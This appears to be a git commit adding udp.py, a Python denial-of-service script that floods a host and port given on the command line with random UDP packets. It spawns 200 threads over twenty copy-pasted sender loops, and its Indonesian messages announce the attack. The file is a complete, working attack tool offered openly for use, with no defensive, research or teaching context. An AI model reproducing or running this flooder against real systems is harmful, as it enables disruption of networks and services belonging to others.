c27808f48d4ccb54721c51a58fe7c36848b8c51e
Gzaaxyz <110292441+gatawuh@users.noreply.github.com>
2022-08-29 17:11:48 +0700

    Add files via upload

---
+++ udp.py
@@ -0,0 +1,255 @@
+import os, sys, time, socket, random, threading
+
+sys.stdout.write("\x1b]2;Bimzzx. | Devices: [1] | Running Attacks [1] | Server Units [8] | Clients: [18]\x07")
+host = str(sys.argv[1])
+port = int(sys.argv[2])
+ip = socket.gethostbyname(host)
+os.system('cls' if os.name == 'nt' else 'clear')
+print(f"Tok.. Tok... Tok.... Paket.. Paket... Dari Bimzzx Menyerang Ip {host} Port {port}")
+time.sleep(1)
+print(f"Tok.. Tok... Tok.... Paket.. Paket... Dari Bimzzx Menyerang Ip {host} Port {port}")
+time.sleep(1)
+print(f"Tok.. Tok... Tok.... Paket.. Paket... Dari Bimzzx Menyerang Ip {host} Port {port}")
+
+
+def run():
+	data = random._urandom(1460)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(50000):
+				s.sendto(data,addr)
+		except:
+			s.close()
+
+def run2():
+	data = random._urandom(1024)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(50000):
+				s.sendto(data,addr)
+		except:
+			s.close()
+
+def run3():
+	data = random._urandom(666)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(50000):
+				s.sendto(data,addr)
+		except:
+			s.close()
+
+def run4():
+	data = random._urandom(900)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(50000):
+				s.sendto(data,addr)
+		except:
+			s.close()
+
+def run5():
+	data = random._urandom(1460)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(50000):
+				s.sendto(data,addr)
+		except:
+			s.close()
+
+def run6():
+	data = random._urandom(1024)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(50000):
+				s.sendto(data,addr)
+		except:
+			s.close()
+
+def run7():
+	data = random._urandom(666)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(50000):
+				s.sendto(data,addr)
+		except:
+			s.close()
+
+def run8():
+	data = random._urandom(900)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(50000):
+				s.sendto(data,addr)
+		except:
+			s.close()
+
+def run9():
+	data = random._urandom(1460)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(50000):
+				s.sendto(data,addr)
+		except:
+			s.close()
+
+def run10():
+	data = random._urandom(1024)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(50000):
+				s.sendto(data,addr)
+		except:
+			s.close()
+
+def run11():
+	data = random._urandom(666)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(50000):
+				s.sendto(data,addr)
+		except:
+			s.close()
+
+def run12():
+	data = random._urandom(900)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(50000):
+				s.sendto(data,addr)
+		except:
+			s.close()
+
+def run13():
+	data = random._urandom(1460)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(50000):
+				s.sendto(data,addr)
+		except:
+			s.close()
+
+def run14():
+	data = random._urandom(1024)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(50000):
+				s.sendto(data,addr)
+		except:
+			s.close()
+
+def run15():
+	data = random._urandom(666)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(50000):
+				s.sendto(data,addr)
+		except:
+			s.close()
+
+def run16():
+	data = random._urandom(900)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(50000):
+				s.sendto(data,addr)
+		except:
+			s.close()
+
+def run17():
+	data = random._urandom(1024)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(50000):
+				s.sendto(data,addr)
+		except:
+			s.close()
+
+def run18():
+	data = random._urandom(1460)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(50000):
+				s.sendto(data,addr)
+		except:
+			s.close()
+
+def run19():
+	data = random._urandom(1024)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(50000):
+				s.sendto(data,addr)
+		except:
+			s.close()
+
+def run20():
+	data = random._urandom(666)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(50000):
+				s.sendto(data,addr)
+		except:
+			s.close()
+
+for _x in range(10):
+	threading.Thread(target=run).start()
+	threading.Thread(target=run2).start()
+	threading.Thread(target=run3).start()
+	threading.Thread(target=run4).start()
+	threading.Thread(target=run5).start()
+	threading.Thread(target=run6).start()
+	threading.Thread(target=run7).start()
+	threading.Thread(target=run8).start()
+	threading.Thread(target=run9).start()
+	threading.Thread(target=run10).start()
+	threading.Thread(target=run11).start()
+	threading.Thread(target=run12).start()
+	threading.Thread(target=run13).start()
+	threading.Thread(target=run14).start()
+	threading.Thread(target=run15).start()
+	threading.Thread(target=run16).start()
+	threading.Thread(target=run17).start()
+	threading.Thread(target=run18).start()
+	threading.Thread(target=run19).start()
+	threading.Thread(target=run20).start()
